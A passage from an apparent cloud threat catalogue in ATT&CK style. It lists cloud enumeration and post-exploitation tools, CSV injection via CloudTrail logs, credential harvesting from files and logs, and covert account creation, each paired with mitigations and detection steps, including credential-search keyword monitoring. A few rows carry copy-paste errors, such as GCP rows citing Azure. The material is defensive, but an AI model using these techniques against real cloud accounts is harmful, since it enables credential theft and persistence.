| AWS Service Enumeration | Matching a collected AWS credential with its associated services.**aws\_service\_enum.py**on the NotSoSecure GitHub page helps identify various AWS services based on the found access or secret key like S3 buckets, service region, Route53 domains, IP addresses, etc. |
| Azure Service Enumeration | Matching a collected Managed Identity access token with its associated services. Providing an access key to**azure\_service\_enum.py**on the NotSoSecure GitHub page will enumerate information related to VM ID’s, hardware and storage profiles, operation system types, etc. |
| GCP Service Enumeration | Matching a collected OAuth Access Token with its associated services. The list of services can be accessed through the REST API interface, but this process is automated through**gcp\_service\_enum.py**on the NotSoSecure GitHub page, where information related to e-mails, applications, storage buckets, can be found. |
| Aws\_pwn | The aws\_pwn GitHub repo has a script named*dump\_account\_data.sh,*which calls account-based read, list, get, and describe functions and saves the data to a given location. |
| CloudSploit | Once an attacker has gained initial access to a cloud environment, whether it is through credentials or exploitation of a vulnerable service, an open-source tool like CloudSploit can be used to detect security risks and potential misconfigurations in various cloud platforms like AWS, Azure, GCP or Oracle Cloud Infrastructure. |
| Barq | Open-source GitHub post-exploitation framework for AWS, created by Voulnet. Features include performing further attacks after intitial access like launching Metasploit and Empire payloads, as well as enumerating information related to EC2 instances, secrets, and metadata. |
| Pacu | Post-exploitation tool created by Rhino Security Labs that enables plug-in functionality for enumeration, privilege escalation, data exfiltration, service exploitation, and log manipulation within AWS. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Multi-factor Authentication | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | *AWS* | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| Privileged Account Management | | Do not allow subscription-level administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. This can be done by first limiting the access that these accounts have outside of the administrative rights, but then also monitoring (details in detection) for events that might show a compromised account. |
|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:**https://support.google.com/a/answer/2405986?hl=en.** |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | AWS | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | GCP | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |
| Temporary Access Tokens | | Rotate access keys often to shorten abuse potential |
| Block Network Discovery Tools | | Prevent tools like nmap, traceroute, ping from non-whitelisted accounts |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.<https://cseweb.ucsd.edu/~savage/papers/CCS09.pdf>. Accessed July 2, 2020.


2.<https://github.com/NotSoSecure/cloud-service-enum/>. Accessed July 6, 2020.


3.<https://github.com/dagrz/aws_pwn>. Accessed July 16. 2020.


4.https://github.com/cloudsploit/scans. Accessed July 22, 2020.


5.https://github.com/Voulnet/barq. Accessed July 23, 2020.


6.https://github.com/RhinoSecurityLabs/pacu. Accessed July 24, 2020.


# CloudTrail/Logging Exploits(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


AWS CloudTrail and Azure Monitor logs are often parsed by people with increased rights or accesses. An attacker with limited access to a resource in an AWS/Azure account can craft a name for a request to the API that will certainly fail but will be logged by the cloud API logging service. If a cloud admin exports these logs for example to a spreadsheet in Excel or Google sheets, which is a common practice, the failed API request may actually contain a formula that will be executed inside a spreadsheet. This will probably be invisible to the admin who has now just unwittingly allowed one of several possible actions to be executed with his credentials.


Examples




| **Name** | **Description** |
| --- | --- |
| Cloudtrail\_csv\_Injection | Open source Pacu module that automates CloudTrail attacks based on manipulation API calls. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Review Logs Outside Spreadsheets | Don’t use spreadsheets to examine cloud-based logs. |


Detection


This attack is nearly impossible to detect unless the administrator recognizes a crafted entry is present within cloud API logs before he attempts to examine it inside a spreadsheet.


References


1.https://www.we45.com/blog/2017/02/14/csv-injection-theres-devil-in-the-detail- Accessed 02/12/2020


# Collecting Data from Cloud Logs(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may be able to use the cloud’s extensive logging capabilities, and the information written to them, as a way to gain information/access to a system. Ultimately, this can lead to the adversary gaining access to user data of a sensitive nature. Logging is essential for many aspects of day to day operations but logging of all information is not always necessary once a system is in production. Some types of log files that can be utilized are server log files, debugging logs, plugin logs, etc.


The Cloud depends on copious logging to make things more transparent to customers who no longer have access to underlying hardware and software layers. The cloud also enables these logs to be distributed to several different locations such as storage accounts, event queues, SIEMS, on premise repositories, etc. Cloud logs can be very informative, telling an adversary what assets are available and how they are protected. Sensitive data may also be exposed in these logs. In Azure for example, Key Vault secrets that would normally be very difficult to obtain may be logged in Logic function logs in the clear by default. The availability and integrity of logs is often stressed by security professionals. The confidentiality of these logs is often not given priority.


Examples




| **Name** | **Description** |
| --- | --- |
| CVE-2020-7599 | Adversaries may exploit a vulnerability in com.gradle.plugin-publish versions prior to 0.11.0 where an author publishes a plugin where the build log is public and the –info flag is used. Under these circumstances the build log will contain an AWS pre-signed URL that would allow an adversary to access the pre-signed URL, of a plugin that was recently uploaded, and replace it with their own plugin. |
| CVE-2019-4284 | IBM Cloud Private versions 2.1.0, 3.1.0, 3.1.1, and 3.1.2 contain a vulnerability that allows a local privileged user to view OpenID Connect tokens that could be printed to log files. These tokens could be utilized to log into the system as other users. |
| CVE-2019-1003062 | Jenkins AWS CloudWatch Logs Publisher Plugin stores unencrypted credentials in its global configuration file, which can be viewed by users who have access to the master file system. |
| CVE-2019-4143 | The Private Key Management Service in IBM Cloud Private versions 3.1.1 and 3.1.2 allows for a user to potentially obtain sensitive information from the KMS plugin log. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Log Configurations | Make the decision on what is necessary to be logged and what is not. |
| Log File Permissions | Make sure that log files have permissions in place to avoid unauthorized read/write access. |
| AWS CIS Benchmark Standards | Refer to the logging section of the AWS CIS Benchmark Standards. These include ensuring CloudTrail is enabled in all regions, enabling log file validation, removing public access to S3 buckets, encrypting CloudTrail logs at rest using KMS CMKs, and enabling VPC flow logging in all VPCs, and integrating CloudTrail trails with CloudWatch Logs. |
| AWS CloudWatch Logs Documentation | IAM Identities (identity-based policies) can be attached to specific writing permissions policies. CloudWatch Log policies use AWS condition keys to express conditions. |
| Azure CIS Benchmark Standards | Refer to the logging section of the Azure CIS Benchmark Standards. These include ensuring that activity logs for storage containers are not publicly accessible and that they are encrypted with BYOK (Bring Your Own Key) |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |


References


1.[CWE. (Feb 20, 2020). CWE-532: Insertion of Sensitive Information into Log File. Retrieved June 9, 2020.](https://cwe.mitre.org/data/definitions/532.html)


2.[CVE. (Jan 21, 2020). CVE-2020-7599. Retrieved June 9, 2020.](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7599)


3.<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4284>. Accessed August 6, 2020.


4.<https://www.youtube.com/watch?v=PgujSug1ZbI>. Accessed June 22, 2020.


5.<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1003062>. Accessed July 17. 2020.


6.https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4143. Accessed August 6, 2020.


7.<https://docs.microsoft.com/en-us/azure/azure-monitor/platform/alerts-activity-log>. Accessed August 6, 2020.


8.<https://docs.microsoft.com/en-us/azure/azure-monitor/platform/alerts-metric-create-templates#template-for-a-metric-alert-that-monitors-multiple-resources>. Accessed August 6, 2020.


# Create New Account(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries with a sufficient level of access may create a local system, domain, or cloud tenant account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.


In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection. In Azure these are called Service Principal accounts.


Examples




| **Name** | **Description** |
| --- | --- |
| Nimbostratus | AWS open source tool that quickly creates surreptitious accounts to maintain access once initial access has been obtained. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | *AWS* | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| [Account Segmentation](https://attack.mitre.org/mitigations/M1030) | | Consider separating different resources under different administrative domains so that credential compromise does not put all assets in danger. In the case of Azure, multiple subscriptions can be created with different administrators that can only access resources within the subscription. The subscriptions can still belong under the same Azure account for overall accounting and administration/policy. |
| [AD Server Configuration](https://attack.mitre.org/mitigations/M1028) | | Use Cloud provided AD services rather than maintaining AD servers in the cloud. These tend to be more integrated into Cloud logs and protections |
| [Privileged Account Management](https://attack.mitre.org/mitigations/M1026) | | Do not allow subscription owner accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. |
|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:**https://support.google.com/a/answer/2405986?hl=en.** |


Detection


Collect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://andresriancho.github.io/nimbostratus/. Accessed July 1, 2020.


# Creating a VM instance(version 1.1)


**Cloud Service Label: IaaS**


Description


It may be possible for an adversary to steal credentials that allow him to create IaaS assets like VM’s without granting him access to a user’s data sources or security services. However, by creating a VM inside a user’s account an adversary may be able to use the new VM as a means of achieving those accesses. New VM’s may be created with default IAM roles or be permitted through firewalls based on their presence within an existing VPC or virtual network.


Examples




| **Name** | **Description** |
| --- | --- |
| Co-residence identification | As pointed out in a research paper written by the University of CaIifornia San Diego and the Massachusetts Institute of Technology, massive or targeted generation of VM instances could be used to identify a specific availability zone for a target cloud instance. EC2 instances in AWS utilize the Xen hypervisor, and identifying the privileged virtual machine (Domain0 or Dom0) can help determine physical co-residence location. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Adhere to zero trust policies | Inspect hosts for listening ports that are unexpected. |
| Prevent traceroute | Disables adversaries from identifying privileged VM’s (Dom0 in EC2) |


Detection


Detecting the presence of port-knocking command and control might be possible based on an examination of simple network flow records. In the known exploit, source ports of packets were not increasing monotonically as is the custom from the same IP client. An inspection of flow records from the host would reveal odd behavior as the source ports of packets were jumping around and were both increasing and decreasing by huge amounts in short order.


References


1. https://www.threatstack.com/security-operations-center/cloud-attack. Accessed Feb 28,2020.


2.<https://cseweb.ucsd.edu/~savage/papers/CCS09.pdf>. Accessed July 2, 2020.


# Credentials in Files(version 1.1)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may search local file systems and remote file shares or registries for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. It is possible to extract passwords from backups or saved virtual machines through Credential Dumping.


In cloud environments, authenticated user credentials are often stored in local configuration and credential files. Developers may also embed cloud resource credentials in code to streamline the access of data from a database or file store believing the content all traffic will be contained within the cloud. In some cases, these credentials can be collected and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. In some scenarios adversaries can use credentials found in files to perform lateral movement.


Examples




| **Name** | **Description** |
| --- | --- |
| CVE-2019-1003062 | Jenkins AWS CloudWatch Logs Publisher Plugin stores credentials unencrypted in job config.xml files on the Jenkins master. These credentials can be viewed by users with Extended Read permission, or access to the master file system. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | *AWS* | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | *Azure* | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | *GCP* | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Password Policies | | Establish an organizational policy that requires good password practices. This includes that passwords are never stored in plaintext. |
|  | *AWS* | Good password practices can be enforced in AWS via the console, AWS CLI, and AWS API. These configurations are for IAM accounts only and have a range of different characteristics that can be enforced. For instance minimum password length, require a range of characters (lowercase, uppercase, number, and non alphanumeric ), allow users to change their own password, password expiration, prevent password reuse, and require administrator reset after password expiration. All details on how to configure these enforcement policies with all three management systems can be found here:[**https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_credentials\_passwords\_account-policy.html**](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html)**.** |
|  | *Azure* | Good password practices can be enforced in Azure with Azure Active Directory using the resource manager deployment. By default these accounts have some policies enforced including amount of lockout duration, and allowed number of logon attempts.Other policies that can be changed are minimum password length and the ability to enforce the concept of ‘passwords complexity requirements’. These configurations can be accomplished by accessing the Active Directory Administrative Center under administrative tools, then editing the rules under the settings for the Password Settings Container. Full details on how to accomplish this can be found here:[**https://docs.microsoft.com/en-us/azure/active-directory-domain-services/password-policy**](https://docs.microsoft.com/en-us/azure/active-directory-domain-services/password-policy) |
| [Restrict File and Directory Permissions](https://attack.mitre.org/mitigations/M1022) | | Users should have limited access to files and directories depending on their need for access. The file and directory permissions should be restricted on the basis of least privilege. |
|  | *AWS* | To manage the files and directory permissions in AWS, IAM policies can be used. This can be done by utilizing group policies and policy variables. The policy would be created specifying the folder, then the permissions attached to that folder (whether the user has access to list out the objects within the directory, if they have read permissions, if they have write permissions, etc.), lastly the group that it applies to would be specified. The users can that be added and removed from that group as needed. Full details on how this can be done is explained here:**https://aws.amazon.com/blogs/security/writing-iam-policies-grant-access-to-user-specific-folders-in-an-amazon-s3-bucket/.** |
|  | *Azure* | To manage the files and directory permissions in an Azure environment basic and advanced system defined controls. This will be dependent on the type of system being used (Windows, Linux, etc). The permissions will be set individually or by group using the system commands or controls needed.. Full details on how this can be done is explained here:**https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions.** |
| Use Metadata Service | | Applications can use the metadata service accessible on the local interface to obtain application tokens to access cloud resources. In Azure for example GET '<http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01> &resource=https://management.azure.com/' HTTP/1.1 Metadata: true |
| [User Training](https://attack.mitre.org/mitigations/M1017) | | Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software files that may be on endpoint systems or servers. |


Detection


While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials and the suspicious activities they undertake with them. Consumers may also wish to monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). Audit application code for embedded passwords or keys.




| **Detection of activities after exploit** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1003062. Retrieved June 7, 2020.


# Data/VM Backups(version 1.0)


**Cloud Service Label: IaaS**


Description


